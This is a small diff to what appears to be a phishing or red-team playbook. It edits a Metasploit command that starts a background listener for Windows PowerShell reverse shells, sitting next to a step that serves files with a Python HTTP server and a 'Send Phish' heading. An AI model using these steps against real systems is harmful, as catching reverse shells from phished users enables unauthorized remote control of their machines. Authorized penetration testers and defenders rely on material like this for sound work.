@@ -54,7 +54,7 @@ python3 -m http.server 8000
 
 - Receive reverse shell (shell 3)
 ```bash
-msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/powershell_reverse_tcp; set LHOST $hip; set LPORT $hport; set ExitOnSession false; run"
+msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/powershell_reverse_tcp; set LHOST $hip; set LPORT $hport; set ExitOnSession false; run -j"
 ```
 
 ## Send Phish
